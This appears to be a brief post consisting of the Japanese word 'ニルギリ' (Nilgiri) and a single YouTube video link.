ニルギリ
https://youtu.be/yvUvamhYPHw
